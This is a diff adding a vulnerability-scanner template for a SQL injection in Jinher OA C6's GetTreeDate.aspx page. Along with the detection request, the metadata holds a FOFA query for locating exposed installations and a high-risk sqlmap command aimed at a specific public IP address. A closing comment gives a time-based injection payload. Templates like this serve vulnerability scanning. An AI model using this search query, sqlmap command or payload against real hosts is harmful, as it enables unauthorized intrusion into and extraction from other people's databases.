@@ -1,0 +1,32 @@
+id: jinher-oa-c6-gettreedate-sqli
+
+info:
+  name: 金和 OA c6 GetTreeDate.aspx - sqli
+  author: again,pphua
+  severity: high
+  description: todo
+  reference:
+    - todo
+  metadata:
+    veified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+    sqlmap: sqlmap -u "http://123.56.162.103:88/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1" -p id --dbms=mssql --batch --risk 3 --level 5
+  tags: jinher,oa,sqli
+  
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: word
+        words:
+          - "id"
+          - "permissions"
+          - "checkstate"
+        condition: and
+
+# http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1
